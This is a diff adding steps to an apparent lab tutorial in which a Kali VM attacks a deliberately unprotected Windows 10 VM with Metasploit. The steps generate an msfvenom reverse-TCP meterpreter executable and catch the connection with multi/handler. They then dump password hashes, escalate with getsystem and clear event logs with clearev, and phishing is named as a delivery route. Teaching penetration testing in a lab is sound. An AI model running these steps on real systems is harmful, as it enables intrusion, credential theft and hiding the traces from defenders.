@@ -20,4 +20,31 @@
 <p>Select Start to run the Kali Linux virtual machine. You can select all of the defaults for the setup prompts. </p>
 
 <h2>2. Configuring Metasploit</h2>
-<p></p>
+<p>- In the Kali Linux VM, select the logo on the top left, then scroll down to where it says “exploitation frameworks”. Select Metasploit to launch the terminal. (PICTURE HERE)</p>
+<p>- It will ask for the password from the account you made for the VM, once entered Metasploit will start running its configuration.</p>
+<p>- From here, you can explore many different exploits, payloads, stagers, & commands by using the “help” or “search” commands</p>
+<p>- For this lab, we will be using the exploit called “exploit/multi/handler” which can be used for many different exploits in Metasploit</p>
+<p>- Before we use this exploit, we need to get our payload onto the target system that will allow our exploit to be conducted successfully. </p>
+<p>- In the msfconsole, type “msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP of Kali Linux machine> LPORT=4444 -f exe > thisismalicious.exe” and hit enter.(PICTURE HERE)</p>
+<p>- This command creates our payload into an executable file, which we will send over to the Windows 10 VM. </p>
+<p>- In this lab environment, simply copy the file & paste it on the Windows 10 VM since the VM’s firewall/security protections are disabled. In a real penetration test, you most likely will not be able to do this. There are many options you can take, such as social engineering, sending a phishing email, etc.</p>
+<p>- Once the executable is on the Windows 10 VM, go back to the Kali Linux terminal and enter “use exploit/multi/handler”. This will create a session in Metasploit and allow us to configure the exploit before running it.</p>
+<p>- Enter “show options”, in which you will see that the exploit needs an LHOST, which will be the Kali Linux IP. The LHOST is the listener machine that receives communication from the executable file/vulnerable machine. </p>
+<p>Enter “set LHOST <Kali Linux IP>”. Enter “show options" again to see the updated configuration. (PICTURE HERE) </p>
+
+<h2>3. Exploiting the Vulnerable Windows 10 VM</h2>
+<p>- Go back to the Windows VM and double-click the executable file</p>
+<p>- On the Kali Linux terminal, enter “run”. You should see that the exploit has executed successfully and you are now in a meterpreter shell!
+(PICTURE HERE)</p>
+
+<h2>4. Using Meterpreter</h2>
+<p>- Meterpreter can be used for a variety of functions in the post-exploitation realm of penetration testing. We can use meterpreter to create persistence, find other vulnerabilities within the victim machine, download sensitive files, etc.</p>
+<p>- For now, we can background this session by selecting “ctrl + z” on the keyboard or by typing in “background”.</p>
+<p>- Now that we have a session on the victim VM, we can use “post/multi/recon/local_exploit_suggester” (PICTURE HERE)</p>
+<p>- Set the session to whatever the session number is listed, and then enter "run"</p>
+<p>Once complete, there are multiple exploits that Metasploit found that the victim VM may be vulnerable to. We can use one of these to accomplish tasks that could be beneficial to the penetration test. (PICTURE)</p>
+<p>If we go back to our session, we can run a variety of commands to get a lot of information from the VM. “Hashdump” can collect all of the password hashes so that we can brute force them offline for example. (PICTURE)</p>
+<p>Try “getsystem” in the meterpreter shell. If successful, this will escalate our account’s privileges to the highest access, Authority. This will allow us to execute almost anything we want on the Windows VM. You can check the status of the account with “getuid”. (PICTURE)</p>
+<p>Feel free to play around with the commands in meterpreter to see what it can accomplish. </p>
+<p>Once you have accomplished your tasks in the penetration test, you can even remove the logs of what you have done in Event Viewer to avoid detection. In the meterpreter shell, enter "clearev". You should see in Event Viewer that the logs are not appearing for what actions you have performed within the VM. (PICTURE) </p>
+<p>There is a lot more to Metasploit, but this is just a very basic overview of what this powerful tool can accomplish in the penetration testing environment!</p>
